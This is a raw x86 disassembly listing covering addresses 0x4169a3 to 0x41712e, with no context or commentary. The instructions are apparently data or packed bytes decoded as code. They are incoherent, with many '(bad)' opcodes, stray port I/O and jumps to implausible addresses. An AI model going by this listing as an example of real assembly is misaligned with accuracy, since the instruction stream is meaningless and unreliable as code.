  4169a3:	les    ebp,FWORD PTR [ebp-0x68038301]
  4169a9:	out    dx,al
  4169aa:	imul   esi,edi,0x9baadfc2
  4169b0:	mov    al,ds:0x4b0b151e
  4169b5:	bound  esp,QWORD PTR [ebx+0x38]
  4169b8:	mov    cl,0xc5
  4169ba:	dec    ecx
  4169bb:	mov    al,0xfa
  4169bd:	mov    eax,0x3f63eb83
  4169c2:	pop    ss
  4169c3:	xchg   ebp,eax
  4169c4:	sbb    eax,DWORD PTR es:[eax-0x71]
  4169c8:	add    BYTE PTR [edx],ch
  4169ca:	out    dx,eax
  4169cb:	dec    ecx
  4169cc:	imul   eax,DWORD PTR [ebp+0x429a009e],0x1dca9811
  4169d6:	or     esp,eax
  4169d8:	lods   eax,DWORD PTR ds:[esi]
  4169d9:	jmp    0x4169d4
  4169db:	and    esp,DWORD PTR [edi-0x1]
  4169de:	icebp  
  4169df:	fcomp  QWORD PTR [esi]
  4169e1:	push   edi
  4169e2:	inc    esp
  4169e3:	call   0xe7dc4751
  4169e8:	and    cl,al
  4169ea:	sbb    cl,dl
  4169ec:	pusha  
  4169ed:	jl     0x416a03
  4169ef:	push   0x1dd473b7
  4169f4:	jnp    0x4169e5
  4169f6:	sahf   
  4169f7:	mov    DWORD PTR [esi],esp
  4169f9:	fwait
  4169fa:	jge    0x4169a0
  4169fc:	cs pop edx
  4169fe:	xchg   DWORD PTR [edx],ebp
  416a00:	stos   DWORD PTR es:[edi],eax
  416a01:	or     edi,ecx
  416a03:	shl    DWORD PTR [edx-0x7b],cl
  416a06:	pop    ebx
  416a07:	xor    eax,0x7e1f97e4
  416a0c:	repz fchs 
  416a0f:	pop    es
  416a10:	stc    
  416a11:	shl    BYTE PTR [edi+eax*4-0x79],cl
  416a15:	fstp   DWORD PTR [esp+ebx*4]
  416a18:	std    
  416a19:	push   eax
  416a1a:	adc    DWORD PTR [edi+edi*8],esi
  416a1d:	add    eax,0x3e270f15
  416a22:	loope  0x416a85
  416a24:	inc    ebx
  416a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a26:	mov    ah,0x7c
  416a28:	push   0xe2c41920
  416a2d:	ror    DWORD PTR [ebx],0xd
  416a30:	mov    WORD PTR [ebp+0x18],fs
  416a33:	and    al,0x3f
  416a35:	loop   0x416aae
  416a37:	(bad)  
  416a38:	dec    edi
  416a39:	jne    0x416a09
  416a3b:	jmp    0xe7fe:0x2129df4
  416a42:	inc    ebx
  416a43:	xchg   edx,eax
  416a44:	mov    WORD PTR [ecx+ecx*8+0x60],?
  416a48:	sub    DWORD PTR [edx-0x72],0x7f
  416a4c:	lea    edi,[ebx+0x52]
  416a4f:	xchg   esi,eax
  416a50:	sbb    eax,0xe36d054c
  416a55:	addr16 pop esi
  416a57:	cmp    al,0x94
  416a59:	mov    ds:0x78d129b2,al
  416a5e:	out    0x41,al
  416a60:	sub    eax,ebx
  416a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a63:	mov    ah,0x25
  416a65:	dec    esi
  416a66:	and    eax,0x7c94604e
  416a6b:	xchg   edi,eax
  416a6c:	or     eax,0x82980f51
  416a71:	ins    DWORD PTR es:[edi],dx
  416a72:	jnp    0x416a2e
  416a74:	pop    ebp
  416a75:	xor    al,al
  416a77:	jns    0x416a6d
  416a79:	cs sub eax,0xe301ab2d
  416a7f:	lods   eax,DWORD PTR ds:[esi]
  416a80:	pushf  
  416a81:	cwde   
  416a82:	pop    esi
  416a83:	xor    ebp,DWORD PTR [ecx-0x21]
  416a86:	mov    WORD PTR [edx+ebx*1-0x5c],cs
  416a8a:	pusha  
  416a8b:	mov    cl,0xdb
  416a8d:	lahf   
  416a8e:	cdq    
  416a8f:	mov    dl,0xe0
  416a91:	popf   
  416a92:	les    ecx,FWORD PTR [edx]
  416a94:	in     al,0x22
  416a96:	outs   dx,BYTE PTR ds:[esi]
  416a97:	fimul  DWORD PTR [esi+0x4b]
  416a9a:	in     eax,0x19
  416a9c:	or     BYTE PTR [edx+0x60],al
  416a9f:	fwait
  416aa0:	popf   
  416aa1:	dec    edx
  416aa2:	and    edx,ebp
  416aa4:	in     eax,dx
  416aa5:	fwait
  416aa6:	arpl   WORD PTR [esi],sp
  416aa8:	dec    esp
  416aa9:	sbb    BYTE PTR [ecx],bl
  416aab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aac:	das    
  416aad:	sub    bh,ch
  416aaf:	pop    ebp
  416ab0:	adc    bh,dh
  416ab2:	push   cs
  416ab3:	out    dx,eax
  416ab4:	xlat   BYTE PTR ds:[ebx]
  416ab5:	push   ecx
  416ab6:	mov    edx,ds
  416ab8:	or     bl,BYTE PTR [ecx+ebx*8-0x7c]
  416abc:	sub    ebp,ecx
  416abe:	inc    ebx
  416abf:	call   DWORD PTR [esi+0x646ab4ff]
  416ac5:	mov    al,ds:0xf121a1af
  416aca:	mov    ebx,?
  416acc:	pop    ebx
  416acd:	cmp    eax,0x7053a88f
  416ad2:	xor    esi,edi
  416ad4:	inc    ebx
  416ad5:	rcl    DWORD PTR [ebx+0x7f617367],cl
  416adb:	push   0xb1018799
  416ae0:	scas   eax,DWORD PTR es:[edi]
  416ae1:	mov    ecx,0xa56fd069
  416ae6:	add    eax,0xa5686dd2
  416aeb:	(bad)  
  416aec:	adc    DWORD PTR [esi+0x4ea5f33b],ecx
  416af2:	jb     0x416af0
  416af4:	mov    BYTE PTR [edx+0x4401bbdc],ah
  416afa:	loopne 0x416b60
  416afc:	call   0x59a21531
  416b01:	pop    esi
  416b02:	xor    bl,dh
  416b04:	mov    eax,0x1818735d
  416b09:	in     al,0xef
  416b0b:	pop    ecx
  416b0c:	mov    cl,0xb4
  416b0e:	jecxz  0x416af4
  416b10:	int3   
  416b11:	pop    edi
  416b12:	mov    ah,0x4
  416b14:	(bad)  
  416b15:	cmpps  xmm3,xmm2,0x78
  416b19:	xor    ecx,ebx
  416b1b:	int    0x45
  416b1d:	pushf  
  416b1e:	sahf   
  416b1f:	fstp   DWORD PTR [eax+0x21]
  416b22:	mov    dl,0xa8
  416b24:	mov    ecx,0xbafdf26e
  416b29:	je     0x416b27
  416b2b:	jle    0x416ad3
  416b2d:	mov    ah,0x46
  416b2f:	(bad)  
  416b30:	retf   0xe9d3
  416b33:	loopne 0x416b3f
  416b35:	lds    edx,FWORD PTR [esi]
  416b37:	iret   
  416b38:	xor    al,0xb3
  416b3a:	xlat   BYTE PTR ds:[ebx]
  416b3b:	(bad)  
  416b3c:	dec    ecx
  416b3d:	sbb    eax,0xbfbc7fe4
  416b42:	(bad)  
  416b43:	arpl   WORD PTR [ebx+0x659a6174],di
  416b49:	ret    0x3fd9
  416b4c:	test   dl,cl
  416b4e:	outs   dx,DWORD PTR ds:[esi]
  416b4f:	xchg   esp,eax
  416b50:	xor    al,0xf2
  416b52:	out    dx,al
  416b53:	cmc    
  416b54:	push   esi
  416b55:	add    eax,0x1ba9991c
  416b5a:	lds    edi,FWORD PTR [ebp+0x83db8d3]
  416b60:	cli    
  416b61:	fldcw  WORD PTR [ecx-0x52]
  416b64:	nop
  416b65:	push   es
  416b66:	push   ss
  416b67:	out    dx,eax
  416b68:	push   0xb5126df6
  416b6d:	pinsrw mm5,WORD PTR [esp+eax*1-0x6cb77391],0xa5
  416b76:	and    edx,ebx
  416b78:	dec    eax
  416b79:	inc    esi
  416b7a:	jb     0x416b7e
  416b7c:	ins    BYTE PTR es:[edi],dx
  416b7d:	mov    esi,0x377bf5da
  416b82:	jae    0x416be5
  416b84:	xchg   ebx,eax
  416b85:	mov    cl,0x30
  416b87:	adc    ecx,DWORD PTR [edx+0x4a216213]
  416b8d:	xor    al,0xc8
  416b8f:	jbe    0x416b78
  416b91:	call   DWORD PTR [esi+0x6c]
  416b94:	mov    esp,0x69f877c3
  416b99:	push   esi
  416b9a:	outs   dx,BYTE PTR ds:[esi]
  416b9b:	fs dec eax
  416b9d:	scas   eax,DWORD PTR es:[edi]
  416b9e:	mov    dl,0xe8
  416ba0:	pop    esi
  416ba1:	shr    BYTE PTR [eax-0x3f],1
  416ba4:	outs   dx,BYTE PTR ds:[esi]
  416ba5:	test   DWORD PTR [edx],esi
  416ba7:	out    0x4b,al
  416ba9:	dec    edx
  416baa:	rol    DWORD PTR [edi-0x1f7125aa],1
  416bb0:	sbb    dh,BYTE PTR [esi+0x6918b550]
  416bb6:	out    dx,al
  416bb7:	mov    WORD PTR [edx-0x48],fs
  416bba:	adc    eax,0x213bc22c
  416bbf:	push   esi
  416bc0:	shl    DWORD PTR [eax-0x3e110feb],0x58
  416bc7:	dec    edi
  416bc8:	pusha  
  416bc9:	lahf   
  416bca:	(bad)  
  416bcb:	jecxz  0x416bcd
  416bcd:	mov    ch,0x5f
  416bcf:	call   FWORD PTR [edx-0x5f]
  416bd2:	xchg   BYTE PTR [eax],al
  416bd4:	ds jmp 0xfdc85084
  416bda:	outs   dx,BYTE PTR ds:[esi]
  416bdb:	adc    al,BYTE PTR [edx+0x36f25dff]
  416be1:	mov    edi,0x30f8cf24
  416be6:	xor    ecx,DWORD PTR [edi+0x5e4bb4e7]
  416bec:	jno    0x416ba6
  416bee:	push   ebx
  416bef:	aas    
  416bf0:	ja     0x416c2a
  416bf2:	pop    ds
  416bf3:	fadd   QWORD PTR [ebp+0x35]
  416bf6:	mov    edi,0xfb52caf7
  416bfb:	aaa    
  416bfc:	fld    TBYTE PTR [esi-0x48]
  416bff:	pop    ecx
  416c00:	stc    
  416c01:	add    ecx,eax
  416c03:	add    eax,0xb9e1b9e0
  416c08:	jl     0x416be0
  416c0a:	(bad)  
  416c0b:	loop   0x416bc4
  416c0d:	daa    
  416c0e:	pop    edi
  416c0f:	ins    BYTE PTR es:[edi],dx
  416c10:	mov    edi,eax
  416c12:	cmp    edx,DWORD PTR [ebp-0x4e]
  416c15:	clc    
  416c16:	enter  0x5820,0x6
  416c1a:	ds jo  0x416ba7
  416c1d:	lea    edi,[edx+0x4a]
  416c20:	inc    ebp
  416c21:	xchg   ebx,eax
  416c22:	ds iret 
  416c24:	pop    eax
  416c25:	jns    0x416c7e
  416c27:	adc    BYTE PTR [edi-0x28],0xfe
  416c2b:	pop    ecx
  416c2c:	adc    esi,DWORD PTR [edi+0x51]
  416c2f:	js     0x416cab
  416c31:	sub    ebp,DWORD PTR [ebx+0x441ed68d]
  416c37:	pop    esi
  416c38:	jge    0x416c6f
  416c3a:	ror    ah,0x1c
  416c3d:	lahf   
  416c3e:	push   0xffffff91
  416c40:	ficomp DWORD PTR [ecx-0x75]
  416c43:	xchg   ebx,eax
  416c44:	shl    BYTE PTR [esi],1
  416c46:	enter  0xa940,0xbf
  416c4a:	and    al,0x92
  416c4c:	jecxz  0x416cb5
  416c4e:	data16 das 
  416c50:	leave  
  416c51:	loope  0x416c2c
  416c53:	jb     0x416cbc
  416c55:	mov    ch,0x4
  416c57:	or     al,0xb0
  416c59:	aas    
  416c5a:	dec    ecx
  416c5b:	add    al,0xef
  416c5d:	loopne 0x416c27
  416c5f:	cld    
  416c60:	cmp    dh,BYTE PTR [edx+0x6b7c9aa2]
  416c66:	dec    esi
  416c67:	cli    
  416c68:	hlt    
  416c69:	adc    al,0xa2
  416c6b:	or     BYTE PTR [ecx-0x2e],ch
  416c6e:	sahf   
  416c6f:	jae    0x416c04
  416c71:	add    al,BYTE PTR [edx]
  416c73:	fnsave [esi]
  416c75:	xchg   edx,eax
  416c76:	or     al,0xd5
  416c78:	call   0xd89dc60
  416c7d:	in     al,0xe3
  416c7f:	pushf  
  416c80:	ficom  WORD PTR [eax-0x76f7b47b]
  416c86:	out    dx,eax
  416c87:	xchg   ebp,eax
  416c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c89:	js     0x416c8a
  416c8b:	je     0x416c9a
  416c8d:	hlt    
  416c8e:	sub    al,0x90
  416c90:	and    al,0x3d
  416c92:	fdiv   st(2),st
  416c94:	shl    BYTE PTR [edx-0x4dcd27a9],cl
  416c9a:	mov    ebx,0xb88c882b
  416c9f:	test   eax,0xeb430940
  416ca4:	inc    ebx
  416ca5:	add    eax,0x263dcf3
  416caa:	dec    ebp
  416cab:	in     eax,0x9
  416cad:	xor    DWORD PTR [ebx+eiz*2-0x32],eax
  416cb1:	xor    eax,0x209d2257
  416cb6:	inc    esp
  416cb7:	adc    cl,al
  416cb9:	fdiv   st(4),st
  416cbb:	inc    ecx
  416cbc:	ja     0x416c68
  416cbe:	pop    ebp
  416cbf:	rcr    DWORD PTR [edi],1
  416cc1:	fidiv  DWORD PTR [eax-0x74a29380]
  416cc7:	pop    ss
  416cc8:	sbb    cl,BYTE PTR [eax-0x184d888e]
  416cce:	fidivr DWORD PTR [ecx]
  416cd0:	and    BYTE PTR [ebp+0x2964bb1],dh
  416cd6:	cwde   
  416cd7:	das    
  416cd8:	xor    esp,DWORD PTR [ecx-0x5ccb7935]
  416cde:	dec    eax
  416cdf:	cmp    cl,BYTE PTR [esi-0x71142317]
  416ce5:	and    DWORD PTR [eax+0x20d408df],edx
  416ceb:	add    al,0x3b
  416ced:	mov    BYTE PTR [edi+eax*1-0x262f0d68],bh
  416cf4:	jmp    0x416d15
  416cf6:	das    
  416cf7:	imul   esi,DWORD PTR [ebp-0x53],0x1
  416cfb:	inc    esp
  416cfc:	xchg   esp,eax
  416cfd:	mov    edi,0x9d0ea5a3
  416d02:	int    0x7a
  416d04:	push   esi
  416d05:	and    BYTE PTR [esp+ebx*8-0x69dd2d3f],dh
  416d0c:	in     al,0x75
  416d0e:	dec    eax
  416d0f:	call   0x96283769
  416d14:	jecxz  0x416d7d
  416d16:	icebp  
  416d17:	es ins DWORD PTR es:[edi],dx
  416d19:	iret   
  416d1a:	pusha  
  416d1b:	sti    
  416d1c:	and    eax,0xef1f0659
  416d21:	leave  
  416d22:	adc    DWORD PTR [ebp+eiz*1+0x79b39e44],ebp
  416d29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d2a:	sbb    eax,0x9199f5d0
  416d2f:	add    al,0xb9
  416d31:	shr    DWORD PTR [edx+eax*1],cl
  416d34:	into   
  416d35:	cmp    bl,al
  416d37:	(bad)  
  416d38:	adc    ebx,DWORD PTR [ebx-0x48a9b27f]
  416d3e:	in     eax,dx
  416d3f:	pop    esp
  416d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d41:	das    
  416d42:	(bad)  
  416d44:	retf   0x722b
  416d47:	lock js 0x416d70
  416d4a:	loope  0x416d8c
  416d4c:	bswap  ecx
  416d4e:	and    eax,0x3a39aba4
  416d53:	or     eax,0x74d00a1f
  416d58:	adc    edx,DWORD PTR gs:[eax+ebx*2]
  416d5c:	mul    BYTE PTR [eax]
  416d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d5f:	and    edi,DWORD PTR [esi]
  416d61:	repz mov cl,0x5e
  416d64:	hlt    
  416d65:	loop   0x416cf0
  416d67:	xchg   DWORD PTR ds:0xe52edee8,esp
  416d6d:	add    al,0x8e
  416d6f:	ins    BYTE PTR es:[edi],dx
  416d70:	jge    0x416d36
  416d72:	(bad)  
  416d73:	lock push cs
  416d75:	mov    cl,0x92
  416d77:	lahf   
  416d78:	aas    
  416d79:	mov    edx,0x6a7e17e
  416d7e:	rep stos DWORD PTR es:[edi],eax
  416d80:	shl    DWORD PTR [ebp+ebp*8-0x241083bd],0x5e
  416d88:	lds    esp,FWORD PTR [ebp-0x1c]
  416d8b:	sbb    eax,0xd28eff2e
  416d90:	fisttp DWORD PTR [ecx]
  416d92:	dec    esi
  416d93:	fbld   TBYTE PTR [edi]
  416d95:	clc    
  416d96:	cmp    eax,0x4bbd7b
  416d9b:	push   cs
  416d9c:	repnz fstp TBYTE PTR [edi-0x6028cb9a]
  416da3:	mov    esi,0x4bddcd68
  416da8:	inc    edi
  416da9:	and    eax,0xb69e6907
  416dae:	popf   
  416daf:	jbe    0x416d3c
  416db1:	int3   
  416db2:	mov    BYTE PTR [ebp+0x56],0x59
  416db6:	add    al,0xab
  416db8:	ret    
  416db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dba:	and    cl,BYTE PTR [ebx+0x578a26b8]
  416dc0:	addr16 faddp st(1),st
  416dc3:	pop    edi
  416dc4:	icebp  
  416dc5:	popa   
  416dc6:	and    BYTE PTR [edx+0x5ee00624],cl
  416dcc:	sub    esp,DWORD PTR [edx]
  416dce:	clc    
  416dcf:	sar    cl,0x49
  416dd2:	retf   0x3565
  416dd5:	jge    0x416d8d
  416dd7:	inc    eax
  416dd8:	lea    edx,[ecx]
  416dda:	jle    0x416e4a
  416ddc:	xlat   BYTE PTR ds:[ebx]
  416ddd:	emms   
  416ddf:	xchg   esp,eax
  416de0:	int3   
  416de1:	xor    al,0x89
  416de3:	imul   edx,DWORD PTR [esi],0x59
  416de6:	stos   DWORD PTR es:[edi],eax
  416de7:	inc    eax
  416de8:	lods   al,BYTE PTR ds:[esi]
  416de9:	loop   0x416da0
  416deb:	daa    
  416dec:	cdq    
  416ded:	dec    ebx
  416dee:	cmp    eax,DWORD PTR [di+0x18]
  416df2:	call   0x68e0:0x9e59f13a
  416df9:	xlat   BYTE PTR ds:[ebx]
  416dfa:	jb     0x416e73
  416dfc:	(bad)  
  416dfd:	data16 adc dh,BYTE PTR [edi+0x78bda5b2]
  416e04:	pop    ecx
  416e05:	ds xchg ebx,eax
  416e07:	mov    ch,0x1a
  416e09:	xchg   BYTE PTR [ecx],bl
  416e0b:	lea    esp,[eax-0x5ff86e68]
  416e11:	xor    ebx,ebp
  416e13:	popfw  
  416e15:	shr    BYTE PTR [ebp+0x62],1
  416e18:	mov    ds:0xef589189,eax
  416e1d:	sti    
  416e1e:	inc    eax
  416e1f:	push   es
  416e20:	and    DWORD PTR [esi],edi
  416e22:	pop    edx
  416e23:	pop    ss
  416e24:	shl    ecx,0x7b
  416e27:	je     0x416e2b
  416e29:	adc    al,0x4a
  416e2b:	mov    DWORD PTR [ecx+0x5ff05a67],eax
  416e31:	lods   al,BYTE PTR ds:[esi]
  416e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e33:	and    eax,0x32980ee0
  416e38:	enter  0x4e70,0x4d
  416e3c:	mov    ds:0x2f8b822e,eax
  416e41:	stc    
  416e42:	popf   
  416e43:	repnz or di,WORD PTR [edi+edi*4+0x70]
  416e49:	(bad)  
  416e4a:	jo     0x416e2e
  416e4c:	in     al,0x81
  416e4e:	cmc    
  416e4f:	push   ecx
  416e50:	lea    ebp,[ebx+0x64]
  416e53:	jo     0x416e76
  416e55:	int3   
  416e56:	leave  
  416e57:	inc    esp
  416e58:	add    dh,dh
  416e5a:	sbb    eax,DWORD PTR ds:0x56897062
  416e60:	leave  
  416e61:	rcl    DWORD PTR [edx],1
  416e63:	dec    esp
  416e64:	je     0x416e8f
  416e66:	fld    st(1)
  416e68:	sbb    BYTE PTR [edi],dh
  416e6a:	cmp    ch,BYTE PTR [ebx+0x45aae171]
  416e70:	jg     0x416e46
  416e72:	xchg   ebx,eax
  416e73:	push   ds
  416e74:	dec    eax
  416e75:	imul   edx,DWORD PTR [esi+ebx*8+0x682608d1],0x174a84c5
  416e80:	push   esi
  416e81:	icebp  
  416e82:	cld    
  416e83:	pusha  
  416e84:	push   edi
  416e85:	fcomp  DWORD PTR [edx-0x11660ae1]
  416e8b:	out    dx,eax
  416e8c:	(bad)  
  416e8d:	jge    0x416ecf
  416e8f:	jl     0x416ef1
  416e91:	inc    edx
  416e92:	pop    esi
  416e93:	(bad)  
  416e94:	xor    edi,DWORD PTR [eax]
  416e96:	adc    DWORD PTR [edi+0x71867a2b],ebx
  416e9c:	push   esp
  416e9d:	icebp  
  416e9e:	and    DWORD PTR [edi+0x33],0x6bb215e7
  416ea5:	shr    BYTE PTR ds:0xb059348f,0x38
  416eac:	mov    cl,0x48
  416eae:	popf   
  416eaf:	out    dx,al
  416eb0:	push   ebx
  416eb1:	push   eax
  416eb2:	jo     0x416e7f
  416eb4:	and    ecx,DWORD PTR [ebp+0x7c]
  416eb7:	cmp    al,0x18
  416eb9:	push   ss
  416eba:	sub    eax,eax
  416ebc:	outs   dx,BYTE PTR ds:[esi]
  416ebd:	and    al,0xd1
  416ebf:	sar    DWORD PTR [edi+0x49],0x29
  416ec3:	push   edi
  416ec4:	(bad)  
  416ec5:	cli    
  416ec6:	push   esp
  416ec7:	in     eax,0x5c
  416ec9:	sub    eax,0x83ad3d28
  416ece:	xor    edi,DWORD PTR [edi]
  416ed0:	jmp    0x416e55
  416ed2:	jmp    0x416e90
  416ed4:	push   cs
  416ed5:	popa   
  416ed6:	in     eax,0xe6
  416ed8:	jmp    0x5689:0x1a3d059a
  416edf:	and    eax,0xd1e608e3
  416ee4:	mov    al,ds:0xb5733707
  416ee9:	scas   eax,DWORD PTR es:[edi]
  416eea:	and    al,0xa6
  416eec:	aam    0x83
  416eee:	dec    edi
  416eef:	ret    
  416ef0:	imul   esp,DWORD PTR [edx+0x24],0xe0f18892
  416ef7:	bound  edx,QWORD PTR [eax-0x3e]
  416efa:	in     al,dx
  416efb:	pop    esp
  416efc:	cs or  al,0xa7
  416eff:	das    
  416f00:	dec    esp
  416f01:	pop    ds
  416f02:	fistp  WORD PTR [edi-0x50]
  416f05:	shl    esi,0xca
  416f08:	mov    cl,0x63
  416f0a:	add    DWORD PTR [ebp+eax*2-0x10],ebx
  416f0e:	(bad)  
  416f0f:	out    0x51,al
  416f11:	ins    BYTE PTR es:[edi],dx
  416f12:	ret    
  416f13:	xchg   BYTE PTR [esi+esi*4],dh
  416f16:	push   esi
  416f17:	mov    dh,0xcc
  416f19:	push   esp
  416f1a:	pop    esi
  416f1b:	add    eax,0xd5303690
  416f20:	mov    ebp,0x279d0068
  416f25:	retf   
  416f26:	jl     0x416f5b
  416f28:	and    edi,DWORD PTR [ebp-0x1]
  416f2b:	inc    esi
  416f2c:	pop    ss
  416f2d:	out    0x5,eax
  416f2f:	clc    
  416f30:	or     al,0xcf
  416f32:	pop    esp
  416f33:	mov    ch,0xe5
  416f35:	mov    es,WORD PTR [eax+ebp*4-0x34]
  416f39:	daa    
  416f3a:	fwait
  416f3b:	popf   
  416f3c:	hlt    
  416f3d:	ds adc al,0xf4
  416f40:	pop    es
  416f41:	mov    eax,0xfa7dc722
  416f46:	std    
  416f47:	push   0xb5cb80b7
  416f4c:	cmp    al,0x68
  416f4e:	sub    ah,BYTE PTR [edi-0x50]
  416f51:	icebp  
  416f52:	pop    edx
  416f53:	(bad)  
  416f54:	ror    BYTE PTR [ebx],cl
  416f56:	jne    0x416f84
  416f58:	and    eax,0x895da002
  416f5d:	jmp    0xee583d1d
  416f62:	fst    QWORD PTR [ecx-0x4f]
  416f65:	mov    cl,0x99
  416f67:	sahf   
  416f68:	xor    DWORD PTR [ecx+0x43],0xac172c24
  416f6f:	cld    
  416f70:	repz push ebx
  416f72:	lahf   
  416f73:	add    DWORD PTR [eax-0xcf032a9],edx
  416f79:	add    DWORD PTR [esi-0x57aac597],ecx
  416f7f:	loopne 0x416f19
  416f81:	(bad)  
  416f82:	sub    BYTE PTR [ebx-0x2a040b71],bl
  416f88:	test   DWORD PTR [edi],edx
  416f8a:	jae    0x416f7c
  416f8c:	xor    DWORD PTR [edi],ebx
  416f8e:	and    eax,0xc684b814
  416f93:	rcr    BYTE PTR [edi],1
  416f95:	push   cs
  416f96:	arpl   WORD PTR [edi+0x51],di
  416f99:	dec    edx
  416f9a:	out    dx,al
  416f9b:	retf   
  416f9c:	dec    edi
  416f9d:	add    bl,BYTE PTR [ebx]
  416f9f:	in     eax,dx
  416fa0:	dec    esi
  416fa1:	jmp    0xb495:0xf475459c
  416fa8:	jne    0x416ff6
  416faa:	sbb    BYTE PTR [eax],dl
  416fac:	sub    eax,ecx
  416fae:	cs cwde 
  416fb0:	cmp    ah,BYTE PTR [ecx]
  416fb2:	test   al,0x92
  416fb4:	mov    dh,0xac
  416fb6:	push   ebx
  416fb7:	ss scas al,BYTE PTR es:[edi]
  416fb9:	mov    eax,ds:0x61671db5
  416fbe:	mov    eax,ds:0xc23d078
  416fc3:	dec    edx
  416fc4:	mov    dl,0x1a
  416fc6:	mov    edx,0xecbe9d2e
  416fcb:	sub    eax,0x7780f0c6
  416fd0:	je     0x417047
  416fd2:	shr    BYTE PTR [edx+0x5f41fbd0],cl
  416fd8:	pop    es
  416fd9:	jns    0x417008
  416fdb:	(bad)  
  416fdc:	jmp    0x416f98
  416fde:	push   edi
  416fdf:	sub    BYTE PTR [eax+0x46ad22f4],bh
  416fe5:	inc    ebp
  416fe6:	and    edx,DWORD PTR [ecx+0x629c06e3]
  416fec:	or     edx,eax
  416fee:	xchg   ecx,eax
  416fef:	xchg   esp,eax
  416ff0:	add    al,0x22
  416ff2:	pop    ss
  416ff3:	sbb    ebp,DWORD PTR [esi+0x2fb0c05c]
  416ff9:	pop    ebp
  416ffa:	jns    0x416fe4
  416ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ffd:	fadd   QWORD PTR [ebp-0x784b6832]
  417003:	(bad)  
  417004:	jmp    0x416fcd
  417006:	pop    eax
  417007:	lock ins DWORD PTR es:[edi],dx
  417009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41700a:	sti    
  41700b:	dec    edx
  41700c:	mov    ah,0x28
  41700e:	ficomp WORD PTR ds:0xed6967a4
  417014:	sub    eax,0xfc63aa6b
  417019:	outs   dx,BYTE PTR ds:[esi]
  41701a:	comiss xmm3,DWORD PTR [esi]
  41701d:	pop    edx
  41701e:	mov    cl,0x6
  417020:	mov    al,ds:0x92d2f099
  417025:	out    0x58,eax
  417027:	mov    dl,0xde
  417029:	in     eax,0x99
  41702b:	xlat   BYTE PTR ds:[ebx]
  41702c:	xchg   ebp,eax
  41702d:	push   edi
  41702e:	and    DWORD PTR [edx],edx
  417030:	jmp    0x3a0fd463
  417035:	push   ds
  417036:	fld    DWORD PTR [esi-0x1a]
  417039:	imul   edi,DWORD PTR [eax+eax*2],0xffffffa5
  41703d:	ins    DWORD PTR es:[edi],dx
  41703e:	dec    esi
  41703f:	enter  0x7550,0xc2
  417043:	inc    ebx
  417044:	clc    
  417045:	push   ecx
  417046:	gs popa 
  417048:	sub    dh,BYTE PTR [bp+si+0x69]
  41704c:	fsubr  st(3),st
  41704e:	out    dx,eax
  41704f:	sub    ch,BYTE PTR [ebx+0x1bbd2de]
  417055:	rcr    BYTE PTR [edi+0x6b7695c3],cl
  41705b:	mov    ds:0xf3346f8f,al
  417060:	(bad)  
  417061:	not    DWORD PTR [ecx-0x6a]
  417064:	ret    0xad88
  417067:	cmp    edx,DWORD PTR [eax+0x1c]
  41706a:	aas    
  41706b:	xchg   ebp,ecx
  41706d:	rol    BYTE PTR [ecx-0x77bf2f81],0xf7
  417074:	call   0xa44e:0x3fad35f3
  41707b:	ret    0xb352
  41707e:	and    DWORD PTR [edi-0x813e9c5],eax
  417084:	shr    ecx,cl
  417086:	icebp  
  417087:	mov    eax,ds:0x3b02cbb
  41708c:	stos   DWORD PTR es:[edi],eax
  41708d:	imul   WORD PTR [ecx]
  417090:	pop    eax
  417091:	jae    0x4170d1
  417093:	mov    eax,0x6e57e8fd
  417098:	sub    BYTE PTR [edi],dl
  41709a:	mov    bh,0x84
  41709c:	xor    ebp,0x32
  41709f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170a0:	loop   0x4170d9
  4170a2:	xchg   esi,eax
  4170a3:	sub    ch,BYTE PTR [ecx+0x4da435ef]
  4170a9:	adc    eax,0xc3ac1310
  4170ae:	xchg   BYTE PTR [esi-0x27],ch
  4170b1:	adc    eax,0xd095155c
  4170b7:	mov    edi,0xe2aa4585
  4170bc:	or     eax,0x71cca246
  4170c1:	pusha  
  4170c2:	xor    ebp,ebx
  4170c4:	lods   eax,DWORD PTR ds:[esi]
  4170c5:	xor    esi,DWORD PTR ds:[esi]
  4170c8:	retf   
  4170c9:	adc    DWORD PTR [esi+edx*4],esi
  4170cc:	in     eax,0xe2
  4170ce:	sub    eax,0x51850521
  4170d3:	cmp    eax,0x67efd38b
  4170d8:	push   eax
  4170d9:	int3   
  4170da:	adc    al,0xae
  4170dc:	ret    
  4170dd:	lahf   
  4170de:	xor    DWORD PTR [eax],esi
  4170e0:	retf   
  4170e1:	and    DWORD PTR [ebp-0x63b6735d],esi
  4170e7:	cdq    
  4170e8:	add    dl,ch
  4170ea:	xchg   esp,eax
  4170eb:	sbb    al,0xab
  4170ed:	mov    BYTE PTR [ecx-0x2d],dh
  4170f0:	js     0x4170b1
  4170f2:	dec    esp
  4170f3:	push   ds
  4170f4:	call   0xafb7169f
  4170f9:	mov    cl,0x90
  4170fb:	pop    esi
  4170fc:	cli    
  4170fd:	repz dec ebp
  4170ff:	mov    WORD PTR [edx],fs
  417101:	bound  edi,QWORD PTR [ecx]
  417103:	xor    al,0xe3
  417105:	out    dx,al
  417106:	fwait
  417107:	les    ebp,FWORD PTR [edi-0x8247958]
  41710d:	out    0x78,eax
  41710f:	cmp    al,0x90
  417111:	mov    al,0x92
  417113:	ror    DWORD PTR fs:[edi+ebp*8-0x70],0x52
  417119:	in     al,0x8d
  41711b:	int3   
  41711c:	into   
  41711d:	push   ebp
  41711e:	gs jmp 0x41713e
  417121:	push   ds
  417122:	sub    ebp,DWORD PTR [edx]
  417124:	and    edi,DWORD PTR [eax]
  417126:	pop    eax
  417127:	dec    ebx
  417128:	xchg   edx,eax
  417129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41712a:	xor    al,0x30
  41712c:	inc    esi
  41712d:	in     eax,dx
  41712e:	fld    DWORD PTR [edx+ecx*1]
